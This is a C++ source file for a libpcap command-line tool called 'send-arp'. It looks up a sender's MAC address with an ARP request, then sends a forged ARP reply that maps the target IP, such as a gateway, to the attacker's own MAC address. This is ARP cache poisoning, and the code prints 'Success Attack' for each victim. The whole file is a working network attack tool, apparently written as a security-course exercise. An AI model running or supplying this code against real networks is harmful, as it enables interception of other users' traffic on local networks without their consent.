#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void GetMyInfo(Ip *myIp, Mac *myMac, char* dev);
int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac);
void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);

EthArpPacket packet;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;

	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);

	if(!ioctl(fd, SIOCGIFHWADDR, &ifr))
		*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
	printf("[MY MAC ADDR = %s]\n", std::string(*myMac).data());
    
    if(!ioctl(fd, SIOCGIFADDR, &ifr))
		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
	
    printf("[MY IP ADDR = %s]\n\n", std::string(*myIp).data());
	
	close(fd);
	return;
}


int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac){
	// mode : 0 = request, 1 = reply
	Mac broadcast = Mac::broadcastMac();
	Mac unknown = Mac::nullMac();

	//eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
	struct pcap_pkthdr* header;
	const u_char* replyPacket;

	while(true){
		SendArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, senderIp);
	
		int res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) return 0;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
		
		EthArpPacket* resPacket;

		resPacket = (struct EthArpPacket *)replyPacket;
		if(resPacket->arp_.sip() == senderIp && resPacket->arp_.tip() == myIp){
			*senderMac = Mac((uint8_t *)(resPacket->arp_.smac_));
			printf("[Sender MAC ADDR = %s]\n",std::string(*senderMac).data());
			printf("[Sender IP ADDR = %s]\n\n",std::string(senderIp).data());
			return 1;
		}
		else continue;
	}
}


void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	// mode : 0 = request, 1 = reply
	
	packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(mode == 0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }else if(mode == 1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;

}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2) {
		usage();
		return -1;
	}

	char* dev = argv[1];

	Ip myIp;
	Mac myMac;
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
	Mac targetMac;

	
	char errbuf[PCAP_ERRBUF_SIZE];

	GetMyInfo(&myIp, &myMac, dev);
	

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i=1;i<argc/2;i++){
		senderIp = Ip(std::string(argv[2*i]));
		targetIp = Ip(std::string(argv[2*i+1]));
		

		if(!GetSenderMac(handle, myIp, myMac, senderIp, &senderMac)){
			fprintf(stderr, "couldn't get victim mac address (%s)\n",errbuf);
		}
		
		SendArpPacket(1, handle, myMac, senderMac, myMac, targetIp, senderMac, senderIp);
		printf("Success Attack\n");
	}

	pcap_close(handle);
}
